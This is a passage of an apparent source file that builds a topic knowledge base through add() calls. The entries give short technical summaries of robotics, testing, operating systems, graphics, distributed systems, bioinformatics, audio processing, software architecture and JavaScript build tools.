    'Industrial automation: PLC (Programmable Logic Controller) — ladder logic, structured text (IEC 61131-3), function block diagram. SCADA (Supervisory Control and Data Acquisition): HMI, data historian, alarm management. Industrial robots: FANUC (KAREL language), KUKA (KRL), ABB (RAPID), Universal Robots (UR script, cobot). Communication: Modbus (RTU/TCP), OPC UA (unified architecture, pub/sub), EtherNet/IP, PROFINET. Industry 4.0: digital twin, predictive maintenance, MES (Manufacturing Execution System). Safety: SIL levels, safety PLCs, light curtains, emergency stops.', 0.85)

  add('robotics_automation', ['drone uav autonomous flight control', 'quadcopter ardupilot px4 flight controller', 'drone programming mavlink mission planning'],
    'Drone & UAV systems: Flight controllers — ArduPilot (open-source, multi-vehicle), PX4 (modular, UORB messaging), Betaflight (racing). Platforms: Pixhawk (hardware), DJI (commercial), custom builds. Communication: MAVLink protocol (telemetry, commands), RC (radio control, SBUS/PPM), 4G/5G links. Autonomous flight: waypoint navigation, GPS-denied (optical flow, visual-inertial odometry), obstacle avoidance. Sensors: IMU (accelerometer + gyroscope), barometer, magnetometer, GPS, downward-facing distance sensor. Flight modes: stabilize, altitude hold, loiter, auto, guided. Regulations: FAA Part 107, EASA, remote ID.', 0.8)

  add('robotics_automation', ['robot simulation gazebo webots virtual', 'digital twin simulation physics engine', 'sim to real transfer domain randomization'],
    'Robot simulation: Gazebo (ROS integration, SDF world files, physics: ODE/Bullet/DART, sensor plugins). Webots (cross-platform, built-in robot models, controller API). Isaac Sim (NVIDIA, GPU-accelerated, photorealistic, Isaac SDK). MuJoCo (fast contact dynamics, DeepMind). Digital twin: virtual replica of physical robot, real-time synchronization. Sim-to-real transfer: domain randomization (vary textures, lighting, physics parameters during training), system identification, fine-tuning on real data. Physics engines: rigid body dynamics, collision detection, friction models. URDF/SDF: robot model description formats (links, joints, inertias, collisions).', 0.8)

  // ── Testing & QA Engineering ──────────────────────────────────────────────
  add('testing_qa', ['unit testing framework jest vitest mocha', 'test driven development tdd methodology', 'integration testing end to end e2e cypress'],
    'Testing fundamentals: Unit testing (test individual functions/methods in isolation), integration testing (test module interactions), E2E testing (test full user workflows). Frameworks: Jest (JavaScript, snapshot testing, mocking), Vitest (Vite-native, fast HMR), Mocha (flexible, BDD/TDD), PyTest (Python, fixtures, parametrize), JUnit (Java), NUnit (.NET). TDD cycle: Red → Green → Refactor. Write failing test first, implement minimal code to pass, refactor. Benefits: better design, regression safety, living documentation.', 0.9)

  add('testing_qa', ['mock stub spy test double dependency', 'test isolation mocking framework sinon', 'fixture factory test data generation'],
    'Test doubles: Mock (verify interactions, programmable behavior), Stub (return predetermined values), Spy (wrap real function, record calls), Fake (simplified working implementation), Dummy (placeholder). Libraries: Sinon.js, Jest mocks (jest.fn(), jest.mock()), unittest.mock (Python), Mockito (Java). Dependency injection for testability. Fixtures: setUp/tearDown, beforeEach/afterEach. Factory pattern: factory_bot (Ruby), Faker.js (realistic data), Fishery (TypeScript). Test data builders for complex objects.', 0.85)

  add('testing_qa', ['behavior driven development bdd cucumber gherkin', 'acceptance testing specification example', 'given when then scenario bdd syntax'],
    'BDD (Behavior-Driven Development): Shared language between developers, QA, and business. Gherkin syntax: Given (preconditions), When (action), Then (expected outcome). Tools: Cucumber (multi-language, step definitions), SpecFlow (.NET), Behave (Python), Cypress-Cucumber. User story format: "As a [role], I want [feature], so that [benefit]". Acceptance criteria as executable specifications. Living documentation from tests. Outside-in development: start from user perspective, drive implementation through failing acceptance tests.', 0.85)

  add('testing_qa', ['code coverage istanbul nyc branch statement', 'mutation testing stryker pitest quality', 'property based testing hypothesis quickcheck'],
    'Test quality metrics: Code coverage — statement coverage, branch coverage, function coverage, line coverage. Tools: Istanbul/nyc (JavaScript), coverage.py (Python), JaCoCo (Java). Mutation testing: introduce bugs (mutants) and verify tests catch them. Tools: Stryker (JavaScript/TypeScript), PITest (Java), mutmut (Python). Property-based testing: generate random inputs, test invariants hold. Tools: fast-check (JavaScript), Hypothesis (Python), QuickCheck (Haskell). Fuzzing: random input generation to find crashes. Coverage ≠ quality; aim for meaningful assertions.', 0.85)

  add('testing_qa', ['performance testing load stress jmeter k6', 'api testing postman newman rest assured', 'visual regression testing percy chromatic'],
    'Specialized testing: Performance — load testing (expected traffic), stress testing (beyond limits), spike testing (sudden bursts). Tools: k6 (JavaScript scripts, CLI), JMeter (GUI, distributed), Gatling (Scala DSL), Locust (Python). API testing: Postman (GUI + collections), Newman (CLI runner), REST Assured (Java), SuperTest (Node.js). Contract testing: Pact (consumer-driven). Visual regression: Percy (snapshot comparison), Chromatic (Storybook), BackstopJS. Accessibility testing: axe-core, pa11y, Lighthouse. Security testing: OWASP ZAP, Burp Suite (already covered in security KB).', 0.8)

  add('testing_qa', ['continuous testing ci cd pipeline automation', 'test pyramid strategy microservice testing', 'flaky test management retry quarantine'],
    'Test strategy: Test pyramid — many unit tests (fast, cheap), fewer integration tests, fewest E2E tests (slow, expensive). Testing trophy (Kent C. Dodds): static analysis → unit → integration → E2E. Microservice testing: contract tests between services, service virtualization. CI/CD integration: run tests on every commit, parallel execution, test splitting. Flaky tests: identify (track pass/fail history), quarantine (separate flaky suite), fix (timing issues, shared state, test order dependency). Test environments: Docker Compose, Testcontainers (disposable containers for integration tests).', 0.85)

  // ── Operating Systems & Internals ───────────────────────────────────────
  add('os_internals', ['linux kernel process thread scheduling', 'operating system process management fork exec', 'cpu scheduling round robin priority preemptive'],
    'OS process management: Process — running program with own memory space, PID. Thread — lightweight execution unit within process, shared memory. Linux: fork() (copy process), exec() (replace with new program), wait() (parent waits for child), clone() (create thread). Process states: new → ready → running → waiting → terminated. Scheduling algorithms: Round Robin (time quantum), Priority (preemptive/non-preemptive), CFS (Completely Fair Scheduler, Linux default, red-black tree), MLFQ (Multi-Level Feedback Queue). Context switch: save/restore registers, TLB flush overhead.', 0.9)

  add('os_internals', ['virtual memory paging page table mmu', 'memory management heap stack allocation', 'page fault tlb cache memory hierarchy'],
    'OS memory management: Virtual memory — each process sees full address space, MMU translates virtual→physical. Page table: maps virtual pages to physical frames. Multi-level page tables (x86: 4 levels for 48-bit addressing). TLB (Translation Lookaside Buffer): page table cache, TLB miss triggers page walk. Page fault: page not in RAM, load from disk (swap). Page replacement: LRU, Clock algorithm, Second Chance. Memory hierarchy: registers (1ns) → L1 cache (2ns) → L2 (7ns) → L3 (20ns) → RAM (100ns) → SSD (100μs) → HDD (10ms). Stack: function calls, local vars. Heap: dynamic allocation (malloc/free, new/delete).', 0.9)

  add('os_internals', ['file system ext4 ntfs btrfs inode', 'disk io block device filesystem mount', 'vfs virtual file system linux kernel'],
    'File systems: ext4 (Linux default, journaling, extents, 1EB max), XFS (high-performance, parallel I/O), Btrfs (copy-on-write, snapshots, checksums), ZFS (pooled storage, RAID-Z, deduplication), NTFS (Windows, ACLs, journaling). Inodes: metadata (permissions, timestamps, block pointers), directory = list of name→inode mappings. VFS (Virtual File System): Linux abstraction layer, uniform interface for all filesystems. Journaling: write-ahead log prevents corruption on crash. Block devices: /dev/sda, /dev/nvme0n1. Mounting: attach filesystem to directory tree. I/O schedulers: mq-deadline, BFQ, kyber, none (NVMe).', 0.85)

  add('os_internals', ['system call syscall linux kernel user space', 'interrupt handler irq trap exception kernel', 'kernel module device driver loadable lkm'],
    'System calls & kernel interface: Syscall — user space requests kernel service (read, write, open, mmap, ioctl, fork, exec). x86-64: syscall instruction, rax = syscall number, arguments in rdi/rsi/rdx/r10/r8/r9. Interrupts: hardware IRQ (keyboard, network card, timer), software interrupt (int 0x80 legacy), exceptions (page fault, divide by zero, general protection). Interrupt handler: save context → handle → restore → iret. Kernel modules: loadable at runtime (insmod/modprobe), device drivers (char/block/network). /proc and /sys: virtual filesystems exposing kernel data. strace: trace syscalls of a process. eBPF: programmable kernel tracing/filtering.', 0.85)

  add('os_internals', ['concurrency synchronization mutex semaphore lock', 'deadlock prevention detection avoidance os', 'race condition critical section atomic operation'],
    'OS concurrency & synchronization: Race condition — multiple threads access shared data, outcome depends on timing. Critical section — code accessing shared resource, must be mutually exclusive. Mutex (mutual exclusion lock): lock/unlock, only one thread at a time. Semaphore: counting (permits N concurrent), binary (= mutex). Spinlock: busy-wait, good for short critical sections (kernel). Read-write lock: multiple readers OR one writer. Condition variable: wait/signal for state changes. Deadlock conditions (Coffman): mutual exclusion, hold-and-wait, no preemption, circular wait. Prevention: lock ordering, timeout, try-lock. Atomic operations: compare-and-swap (CAS), fetch-and-add, memory barriers/fences.', 0.85)

  add('os_internals', ['container virtualization docker namespace cgroup', 'hypervisor vm kvm qemu virtual machine', 'linux namespace pid network mount isolation'],
    'OS virtualization: Containers — OS-level virtualization using Linux namespaces (PID, network, mount, user, UTS, IPC) and cgroups (CPU, memory, I/O limits). Docker: container runtime, layered images (UnionFS/OverlayFS). Hypervisors: Type 1 (bare-metal: KVM, Xen, VMware ESXi), Type 2 (hosted: VirtualBox, VMware Workstation). KVM: Linux kernel module, hardware-assisted (VT-x/AMD-V), QEMU for device emulation. Paravirtualization: virtio drivers for efficient I/O. Microkernel vs monolithic: Linux (monolithic + modules), Minix/seL4 (microkernel). seccomp: restrict syscalls. AppArmor/SELinux: mandatory access control.', 0.85)

  // ── Computer Graphics & Visualization ───────────────────────────────────
  add('computer_graphics', ['opengl vulkan directx graphics api rendering', 'shader program vertex fragment pixel gpu', 'graphics pipeline rasterization rendering engine'],
    'Graphics APIs & pipeline: OpenGL (cross-platform, mature, OpenGL ES for mobile), Vulkan (low-level, explicit control, multi-threaded), DirectX 12 (Windows, low-level), Metal (Apple). Graphics pipeline: vertex data → vertex shader (transform positions) → tessellation → geometry shader → rasterization (triangles→fragments) → fragment/pixel shader (color per pixel) → depth/stencil test → framebuffer. Shading languages: GLSL (OpenGL), HLSL (DirectX), SPIR-V (Vulkan intermediate), MSL (Metal). GPU architecture: massive parallelism, SIMD, shader cores, texture units, ROPs.', 0.9)

  add('computer_graphics', ['ray tracing path tracing global illumination', 'physically based rendering pbr material', 'ambient occlusion shadow mapping reflection'],
    'Ray tracing & rendering: Ray tracing — cast rays from camera through pixels into scene. Primary rays (visibility), shadow rays (light occlusion), reflection/refraction rays. Path tracing: Monte Carlo integration of rendering equation, physically accurate global illumination. BVH (Bounding Volume Hierarchy): acceleration structure for ray-scene intersection. RTX hardware: RT cores (Nvidia), ray accelerators (AMD). PBR (Physically Based Rendering): metallic-roughness workflow, BRDF (Bidirectional Reflectance Distribution Function), Cook-Torrance model, energy conservation. HDR, tone mapping (ACES, Reinhard), gamma correction.', 0.85)

  add('computer_graphics', ['3d modeling mesh polygon vertex normal', 'texture mapping uv unwrap normal map', 'skeletal animation rigging bone keyframe'],
    '3D modeling & animation: Mesh — vertices, edges, faces (triangles/quads). Normals: per-vertex or per-face, used for lighting. UV mapping: 2D texture coordinates on 3D surface, unwrapping. Texture types: diffuse/albedo, normal map (surface detail without geometry), roughness, metallic, AO (ambient occlusion), displacement/height. Skeletal animation: bone hierarchy (skeleton), vertex skinning (bone weights), keyframe interpolation (linear, Bezier, quaternion slerp). Morph targets/blend shapes: facial animation. Formats: glTF (web/runtime), FBX (interchange), OBJ (simple), USD (Universal Scene Description, Pixar).', 0.85)

  add('computer_graphics', ['webgl threejs 3d web browser rendering', 'webgpu compute shader web graphics', 'canvas svg 2d graphics html5 drawing'],
    'Web graphics: WebGL (OpenGL ES 2.0/3.0 in browser, JavaScript API, shaders in GLSL ES). Three.js: popular WebGL library (scene, camera, renderer, materials, lights, loaders). WebGPU: next-gen web graphics API (compute shaders, modern GPU features, WGSL shading language). Canvas 2D: immediate mode drawing API (fillRect, arc, bezierCurveTo, drawImage). SVG: vector graphics in DOM (scalable, CSS-styleable, accessible). Libraries: D3.js (data visualization), PixiJS (2D WebGL), Babylon.js (3D engine), PlayCanvas (game engine). Performance: requestAnimationFrame, offscreen canvas, instanced rendering.', 0.85)

  add('computer_graphics', ['image processing convolution filter blur', 'computer vision opencv feature detection', 'color space rgb hsv lab color model'],
    'Image processing: Convolution filters — blur (Gaussian, box), sharpen, edge detection (Sobel, Canny, Laplacian). Morphological operations: erosion, dilation, opening, closing. Color spaces: RGB (additive, display), HSV/HSL (intuitive: hue, saturation, value), Lab (perceptually uniform), CMYK (subtractive, print), YCbCr (video compression). Histogram equalization: improve contrast. Image formats: JPEG (lossy, DCT), PNG (lossless, alpha), WebP (modern, lossy+lossless), AVIF (AV1-based). Libraries: OpenCV (computer vision, feature detection, optical flow), Pillow/PIL (Python), Sharp (Node.js), ImageMagick (CLI).', 0.8)

  add('computer_graphics', ['data visualization chart plot d3 matplotlib', 'scientific visualization volume rendering', 'information visualization dashboard design'],
    'Data & scientific visualization: Charts — bar, line, scatter, pie, histogram, heatmap, treemap, sankey. Libraries: D3.js (web, SVG/Canvas, data-driven), Matplotlib (Python, publication quality), Plotly (interactive, web), Vega-Lite (declarative grammar), Chart.js (simple web charts). Scientific visualization: volume rendering (medical CT/MRI, isosurfaces, transfer functions), vector field visualization (flow, streamlines), point cloud rendering. Dashboard design: KPI hierarchy, Gestalt principles, color-blind safe palettes, responsive layouts. Tools: Grafana (metrics), Tableau (BI), Observable (notebooks). GPU-accelerated: deck.gl, regl.', 0.8)

  // ── Distributed Systems & Microservices ─────────────────────────────────
  add('distributed_systems', ['cap theorem consistency availability partition', 'distributed consensus raft paxos algorithm', 'eventual consistency strong consistency model'],
    'Distributed systems theory: CAP theorem — in network partition, choose either Consistency or Availability (can\'t have both + partition tolerance). PACELC: extends CAP with latency tradeoff when no partition. Consistency models: strong (linearizability — appears as single copy), sequential, causal, eventual (replicas converge given time). Consensus algorithms: Raft (leader election, log replication, understandable), Paxos (theoretical foundation, complex), ZAB (ZooKeeper). Two-phase commit (2PC): prepare → commit/abort (blocking). Three-phase commit: non-blocking but complex. Byzantine fault tolerance: BFT for malicious nodes (blockchain uses this).', 0.9)

  add('distributed_systems', ['message queue kafka rabbitmq event streaming', 'pub sub messaging async communication', 'event driven architecture cqrs event sourcing'],
    'Message queues & event-driven architecture: Apache Kafka (distributed log, partitions, consumer groups, exactly-once semantics, high throughput). RabbitMQ (AMQP, exchanges/queues/bindings, routing, acknowledgments). Redis Streams (lightweight). Amazon SQS (managed). Patterns: pub/sub (fan-out), point-to-point (work queue), request-reply. Event sourcing: store events as source of truth, rebuild state by replaying. CQRS (Command Query Responsibility Segregation): separate write (commands) and read (queries) models. Saga pattern: distributed transaction as sequence of local transactions with compensating actions.', 0.9)

  add('distributed_systems', ['microservice architecture service mesh api gateway', 'service discovery consul etcd registry', 'circuit breaker retry bulkhead resilience pattern'],
    'Microservices patterns: Service decomposition (bounded context from DDD), API gateway (routing, auth, rate limiting — Kong, Envoy). Service discovery: Consul (health checking), etcd (key-value), Eureka (Netflix). Service mesh: Istio/Envoy (sidecar proxy, mTLS, traffic management, observability), Linkerd. Resilience patterns: circuit breaker (prevent cascade failures — Hystrix, Resilience4j), retry with exponential backoff, bulkhead (isolate failures), timeout. Sidecar pattern: attach helper container to main service. Strangler fig: gradually migrate monolith to microservices.', 0.85)

  add('distributed_systems', ['distributed database sharding replication partition', 'consistent hashing ring partition strategy', 'vector clock lamport timestamp ordering'],
    'Distributed data: Sharding — horizontal partitioning across nodes. Strategies: range-based, hash-based, consistent hashing (minimal remapping on node add/remove, virtual nodes). Replication: leader-follower (single write point), multi-leader (conflict resolution), leaderless (quorum reads/writes — Dynamo-style). Vector clocks: track causal ordering across nodes. Lamport timestamps: logical clock for event ordering. Conflict resolution: last-writer-wins (LWW), merge (CRDTs — Conflict-free Replicated Data Types: G-Counter, PN-Counter, LWW-Register, OR-Set). Gossip protocol: epidemic-style information dissemination.', 0.85)

  add('distributed_systems', ['kubernetes container orchestration pod deployment', 'docker compose container networking volume', 'helm chart kubernetes manifest yaml config'],
    'Container orchestration: Kubernetes — pods (container groups), deployments (desired state, rolling updates), services (stable networking, ClusterIP/NodePort/LoadBalancer), ingress (HTTP routing). Scaling: HPA (Horizontal Pod Autoscaler), VPA (Vertical), cluster autoscaler. Storage: PersistentVolume/PersistentVolumeClaim, StorageClass. ConfigMaps/Secrets for configuration. Helm: package manager, charts (templates + values). Operators: custom controllers for application-specific logic. Docker Compose: multi-container dev environments. Kubernetes networking: CNI plugins (Calico, Cilium), network policies, DNS (CoreDNS).', 0.85)

  add('distributed_systems', ['observability tracing logging metrics monitoring', 'opentelemetry jaeger zipkin distributed tracing', 'prometheus grafana alerting sre monitoring'],
    'Observability (three pillars): Metrics — numeric measurements over time (counters, gauges, histograms). Prometheus (pull-based, PromQL, alerting rules), Grafana (dashboards). Logging — structured logs (JSON), log aggregation. ELK Stack (Elasticsearch, Logstash, Kibana), Loki (Grafana). Tracing — follow requests across services, span/trace IDs. OpenTelemetry (vendor-neutral SDK, auto-instrumentation), Jaeger, Zipkin. SRE concepts: SLI (Service Level Indicator), SLO (Service Level Objective), SLA (Service Level Agreement), error budget. Alerting: PagerDuty, OpsGenie. Health checks: liveness, readiness probes.', 0.85)

  // ── Bioinformatics & Computational Biology ──────────────────────────────
  add('bioinformatics', ['dna rna sequence alignment bioinformatics', 'genome sequencing assembly annotation', 'blast sequence search homology alignment tool'],
    'Sequence analysis: DNA (A, T, G, C), RNA (A, U, G, C), Protein (20 amino acids). Sequence alignment: pairwise (Needleman-Wunsch global, Smith-Waterman local), multiple (ClustalW, MUSCLE, MAFFT). BLAST (Basic Local Alignment Search Tool): fast heuristic sequence search against databases (NCBI nr/nt). Scoring matrices: BLOSUM (protein blocks), PAM (evolutionary distance). Genome sequencing: Sanger (long reads, low throughput), Illumina (short reads, high throughput, paired-end), PacBio/Oxford Nanopore (long reads, real-time). Assembly: de Bruijn graph (short reads), overlap-layout-consensus (long reads). Annotation: gene prediction, functional annotation.', 0.9)

  add('bioinformatics', ['protein structure folding prediction alphafold', 'molecular dynamics simulation md force field', 'drug discovery virtual screening docking'],
    'Structural bioinformatics: Protein structure levels — primary (sequence), secondary (α-helix, β-sheet), tertiary (3D fold), quaternary (multi-chain). AlphaFold2 (DeepMind): revolutionary structure prediction from sequence using attention-based neural network. PDB (Protein Data Bank): experimental structures (X-ray, cryo-EM, NMR). Molecular dynamics: simulate atomic motion using force fields (AMBER, CHARMM, GROMACS). Drug discovery: virtual screening (dock compound library against target), molecular docking (AutoDock, Glide), pharmacophore modeling, ADMET prediction. Rosetta: protein design and structure prediction suite.', 0.85)

  add('bioinformatics', ['genomics transcriptomics rna seq gene expression', 'single cell sequencing scrna seq analysis', 'variant calling snp mutation genotype analysis'],
    'Omics data analysis: Genomics — whole genome sequencing (WGS), variant calling (GATK: BWA alignment → MarkDuplicates → HaplotypeCaller), SNP/indel detection, structural variants. Transcriptomics — RNA-seq: read alignment (STAR, HISAT2) → quantification (featureCounts, Salmon) → differential expression (DESeq2, edgeR). Single-cell RNA-seq: 10x Genomics, cell clustering (Seurat, Scanpy), UMAP/t-SNE visualization, trajectory analysis. Epigenomics: ChIP-seq (histone marks, TF binding), ATAC-seq (chromatin accessibility), methylation (bisulfite sequencing).', 0.85)

  add('bioinformatics', ['biopython', 'bioconductor', 'bioinformatics', 'phylogenetic', 'phylogenetics', 'metagenomics', 'microbiome', '16s amplicon'],
    'Bioinformatics tools & analysis: BioPython (sequence I/O, BLAST, PDB parsing), Bioconductor (R packages for genomics), Galaxy (web-based workflow platform). Phylogenetics: evolutionary trees from sequence data. Methods: maximum likelihood (RAxML, IQ-TREE), Bayesian (MrBayes, BEAST), neighbor-joining. Molecular clock: estimate divergence times. Metagenomics: study microbial communities. 16S rRNA amplicon sequencing (QIIME2, DADA2), shotgun metagenomics (Kraken2, MetaPhlAn). Microbiome: diversity metrics (Shannon, Simpson), beta diversity (UniFrac, Bray-Curtis), taxonomic profiling.', 1.1)

  add('bioinformatics', ['machine learning genomics deep learning biology', 'protein language model esm transformer', 'biomarker discovery feature selection omics'],
    'ML in biology: Deep learning for genomics — CNNs for motif detection (DeepBind), RNNs for sequence classification, transformers for gene expression (Enformer). Protein language models: ESM (Meta, attention-based, embeddings for structure/function prediction), ProtTrans, protein representation learning. Biomarker discovery: feature selection from high-dimensional omics data (LASSO, random forest importance, differential analysis). Drug response prediction. Graph neural networks for molecular property prediction. AlphaFold, RFdiffusion (protein design). Foundation models: scGPT (single-cell), Evo (DNA language model). Data: FASTA, FASTQ, BAM/SAM, VCF, GFF/GTF file formats.', 0.8)

  // ── Audio & Signal Processing ───────────────────────────────────────────
  add('audio_signal', ['digital audio processing dsp sample rate', 'audio signal waveform frequency spectrum', 'fourier transform fft spectral analysis'],
    'Digital audio fundamentals: Sound — pressure waves, frequency (Hz, pitch), amplitude (volume), timbre. Sampling: continuous→discrete, sample rate (44.1kHz CD, 48kHz video, 96kHz hi-res). Nyquist theorem: sample rate ≥ 2× highest frequency to avoid aliasing. Bit depth: 16-bit (CD, 96dB dynamic range), 24-bit (professional, 144dB). FFT (Fast Fourier Transform): time domain→frequency domain, O(N log N). Spectrogram: frequency vs time visualization. Windowing: Hanning, Hamming, Blackman (reduce spectral leakage). STFT (Short-Time Fourier Transform): windowed FFT for time-frequency analysis.', 0.9)

  add('audio_signal', ['audio synthesis oscillator filter envelope', 'midi music programming sequencer protocol', 'synthesizer wavetable fm additive subtractive'],
    'Audio synthesis: Oscillators — sine, square, sawtooth, triangle waveforms. Synthesis types: subtractive (oscillator→filter→amplifier, classic analog), additive (sum of sine waves), FM (frequency modulation, Yamaha DX7), wavetable (morphing waveforms), granular (tiny grains of audio), physical modeling (simulate instrument physics). MIDI: Musical Instrument Digital Interface, note on/off, velocity, CC (continuous controller), program change. Standard: 128 notes, 16 channels. Envelope: ADSR (Attack, Decay, Sustain, Release) — shapes sound over time. LFO (Low Frequency Oscillator): modulation of parameters.', 0.85)

  add('audio_signal', ['web audio api javascript sound browser', 'audio worklet real time processing node', 'tone js howler audio library web'],
    'Web Audio API: AudioContext (audio graph), nodes: OscillatorNode (waveforms), GainNode (volume), BiquadFilterNode (lowpass/highpass), ConvolverNode (reverb), AnalyserNode (FFT/waveform data), AudioBufferSourceNode (play samples). AudioWorklet: custom DSP in dedicated thread (replaces deprecated ScriptProcessorNode). Libraries: Tone.js (music framework, synths, effects, transport, scheduling), Howler.js (simple playback, sprites, spatial audio), Pizzicato.js (effects chain). MediaStream API: microphone input. Web MIDI API: connect MIDI controllers. Audio encoding: MP3, AAC, OGG Vorbis, FLAC, WAV.', 0.85)

  add('audio_signal', ['audio effect reverb delay distortion eq', 'convolution impulse response audio filter', 'compression limiter dynamics processing audio'],
    'Audio effects & processing: EQ (equalizer — parametric, graphic, shelving filters to shape frequency response). Reverb: algorithmic (Schroeder, FDN — Feedback Delay Network), convolution (impulse response of real spaces). Delay: echo, ping-pong, tape delay. Distortion: overdrive, fuzz, bitcrusher, waveshaping. Chorus/flanger/phaser: modulated delay lines. Compressor: reduce dynamic range (threshold, ratio, attack, release, knee). Limiter: brick-wall ceiling. Noise gate: suppress below threshold. Side-chain compression: ducking (radio/EDM technique). DSP concepts: IIR/FIR filters, z-transform, biquad coefficients.', 0.85)

  add('audio_signal', ['speech processing recognition voice analysis', 'audio feature extraction mfcc mel spectrogram', 'noise reduction cancellation beamforming audio'],
    'Speech & audio analysis: Feature extraction — MFCC (Mel-Frequency Cepstral Coefficients, 13-40 coefficients), mel spectrogram (perceptual frequency scale), chromagram (pitch class), zero-crossing rate, spectral centroid/rolloff. Speech processing: pitch detection (autocorrelation, YIN algorithm), formant analysis, voice activity detection (VAD). Noise reduction: spectral subtraction, Wiener filter, deep learning (RNNoise, DTLN). Beamforming: microphone array, direction-of-arrival estimation. Audio classification: environmental sound (ESC-50), music genre, instrument recognition. Libraries: librosa (Python), essentia, SpeechBrain, torchaudio.', 0.8)

  add('audio_signal', ['music information retrieval mir audio analysis', 'beat detection tempo estimation rhythm', 'audio fingerprinting recognition shazam matching'],
    'Music Information Retrieval (MIR): Beat tracking — detect rhythmic pulse, estimate tempo (BPM), downbeat detection. Onset detection: identify when notes begin (spectral flux, high-frequency content). Chord recognition: chromagram → chord template matching. Key detection: Krumhansl-Schmuckler algorithm. Source separation: isolate vocals/instruments from mix (Spleeter, Demucs, Open-Unmix). Audio fingerprinting: generate compact signature from audio (Chromaprint/AcoustID), robust to noise/compression, used by Shazam (spectrogram constellation map). Music generation: Magenta (Google), MuseNet, Jukebox. ISMIR conference. MIR tools: librosa, madmom, mir_eval.', 0.8)

  // ── Software Architecture Patterns ──────────────────────────────────────
  add('software_architecture', ['microservices architecture service decomposition', 'domain driven design ddd bounded context', 'event driven architecture event sourcing cqrs'],
    'Software architecture patterns: Microservices — decompose monolith into independently deployable services. Bounded contexts (DDD), service per business capability. Communication: synchronous (REST, gRPC) vs asynchronous (message queues, event bus). Service mesh (Istio, Linkerd): sidecar proxy for traffic management, observability, security. Challenges: distributed transactions (saga pattern), data consistency, service discovery, circuit breaker (Resilience4j, Hystrix). Decomposition strategies: by business capability, by subdomain, strangler fig pattern (gradual migration). Conway\'s Law: system design mirrors org structure.', 0.9)

  add('software_architecture', ['clean architecture hexagonal ports adapters', 'onion architecture dependency inversion layer', 'vertical slice architecture feature based'],
    'Layered architectures: Clean Architecture (Uncle Bob) — concentric circles: entities → use cases → interface adapters → frameworks. Dependency rule: inner layers never depend on outer. Hexagonal Architecture (Ports & Adapters, Alistair Cockburn): core domain with ports (interfaces) and adapters (implementations). Onion Architecture: similar to hexagonal, domain at center. Vertical Slice Architecture: organize by feature not layer, each slice owns its full stack. Benefits: testability, independence from frameworks/UI/DB. Trade-offs: more boilerplate, indirection. SOLID principles fundamental to all.', 0.85)

  add('software_architecture', ['cqrs command query responsibility segregation', 'event sourcing event store replay aggregate', 'saga pattern distributed transaction compensation'],
    'CQRS (Command Query Responsibility Segregation): separate read/write models. Commands (write) → aggregate → events. Queries (read) → read model/projection. Event Sourcing: store events (facts) not state. Event store: append-only log. Replay: reconstruct state from events. Snapshots: optimization for long event streams. Saga pattern: manage distributed transactions. Choreography saga: events trigger next step. Orchestration saga: central coordinator. Compensating transactions: undo on failure. Eventual consistency: accept temporary inconsistency. Benefits: audit trail, temporal queries, debugging. Tools: EventStoreDB, Axon Framework, Marten.', 0.85)

  add('software_architecture', ['domain driven design aggregate entity value object', 'ubiquitous language bounded context context map', 'repository pattern specification domain service'],
    'Domain-Driven Design (DDD, Eric Evans): Tactical patterns — Entity (identity), Value Object (immutable, equality by value), Aggregate (consistency boundary, aggregate root), Domain Event (something happened), Repository (collection-like persistence), Domain Service (stateless operations), Specification (business rules as objects), Factory (complex creation). Strategic patterns — Bounded Context (explicit boundary), Context Map (relationships between contexts), Ubiquitous Language (shared vocabulary), Anti-corruption Layer (translate between contexts). Relationships: shared kernel, customer-supplier, conformist, open-host.', 0.85)

  add('software_architecture', ['modular monolith module boundary cohesion', 'service oriented architecture soa enterprise bus', 'space based architecture distributed cache grid'],
    'Alternative architectures: Modular Monolith — single deployment with strong module boundaries. Benefits of monolith (simpler ops) + benefits of microservices (loose coupling). Module = bounded context with explicit public API. SOA (Service-Oriented Architecture): enterprise services, ESB (Enterprise Service Bus), SOAP/WSDL. Differences from microservices: larger services, shared data, ESB vs smart endpoints. Space-Based Architecture: distributed in-memory data grid, processing units, virtual middleware. For high-scalability (trading, gaming). Serverless architecture: FaaS (AWS Lambda, Azure Functions), event-driven, pay-per-use, cold start considerations.', 0.8)

  add('software_architecture', ['architecture decision record adr documentation', 'fitness function architecture governance metric', 'evolutionary architecture incremental change'],
    'Architecture governance: ADR (Architecture Decision Record): document decisions with context, decision, consequences. Template: title, status, context, decision, consequences. Fitness functions: automated architecture governance. Examples: dependency rules (no cyclic deps), layer violations, performance budgets, security compliance. Tools: ArchUnit (Java), NetArchTest (.NET), ts-arch (TypeScript). Evolutionary Architecture: support incremental, guided change. Principles: last responsible moment, reversibility, small experiments. Architecture characteristics (ilities): scalability, availability, reliability, maintainability, observability, security, performance, testability.', 0.8)

  // ── DevTools & Build Systems ──────────────────────────────────────────
  add('devtools_build', ['webpack bundler module federation code splitting', 'vite esbuild fast build tool hmr rollup', 'turbopack rspack next generation bundler speed'],
    'JavaScript bundlers: Webpack — module bundler, loaders (transform files), plugins (extend functionality), code splitting (dynamic import), Module Federation (micro-frontends, share modules across apps), tree shaking. Config: webpack.config.js. Vite — dev server (native ESM, instant HMR), production build (Rollup). esbuild — Go-based, 10-100x faster than webpack. Turbopack — Rust-based (Vercel), incremental computation. Rspack — Rust Webpack-compatible. Parcel — zero-config. Rollup — library bundling, ES modules. Bun — all-in-one (runtime + bundler + package manager).', 0.9)

  add('devtools_build', ['eslint prettier code formatter linter static', 'typescript compiler tsc strict mode config', 'babel transpiler polyfill core js preset env'],
    'Code quality tools: ESLint — pluggable linter, rules (warn/error/off), extends (airbnb, standard), plugins (react, typescript), flat config (eslint.config.js). Prettier — opinionated formatter, printWidth, tabWidth, singleQuote, trailingComma. Integration: eslint-config-prettier (disable conflicting rules). TypeScript compiler (tsc): tsconfig.json — strict mode (strictNullChecks, noImplicitAny), target (ES2022+), module (ESNext, CommonJS), paths (aliases). Babel — transpile modern JS for older browsers, presets (@babel/preset-env, @babel/preset-react), polyfills (core-js). SWC — Rust-based Babel alternative, 20x faster.', 0.85)

  add('devtools_build', ['npm yarn pnpm package manager workspace monorepo', 'turborepo nx lerna monorepo build orchestration', 'changesets semantic versioning release automation'],
    'Package management & monorepos: npm (default Node.js), yarn (Plug\'n\'Play, zero-installs), pnpm (content-addressable store, strict, fast). Workspaces: multiple packages in one repo. Monorepo tools: Turborepo (Vercel, remote caching, task pipelines), Nx (computation caching, affected detection, generators), Lerna (versioning, publishing, now maintained by Nx). Release management: Changesets (version management, changelog generation), semantic-release (automated versioning from commits), conventional commits. Lock files: package-lock.json, yarn.lock, pnpm-lock.yaml. .npmrc configuration.', 0.85)

